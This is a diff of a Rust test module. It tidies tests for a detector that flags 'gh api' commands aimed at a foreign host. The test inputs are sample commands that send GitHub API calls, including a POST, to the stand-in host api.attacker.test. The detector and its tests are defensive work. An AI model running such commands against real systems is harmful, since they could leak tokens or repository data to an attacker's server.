@@ -1850,10 +1850,9 @@ mod tests {
             let input = json!({"command":command});
             assert!(!command_has_explicit_foreign_api_host("Bash", Some(&input)));
         }
-        for command in ["gh api --hostname api.attacker.test repos/acme/widget/pulls"] {
-            let input = json!({"command":command});
-            assert!(command_has_explicit_foreign_api_host("Bash", Some(&input)));
-        }
+        let input =
+            json!({"command":"gh api --hostname api.attacker.test repos/acme/widget/pulls"});
+        assert!(command_has_explicit_foreign_api_host("Bash", Some(&input)));
         let absolute_with_foreign_hostname = json!({
             "command":"gh api --hostname=api.attacker.test -X POST https://api.github.com/repos/acme/widget/pulls"
         });
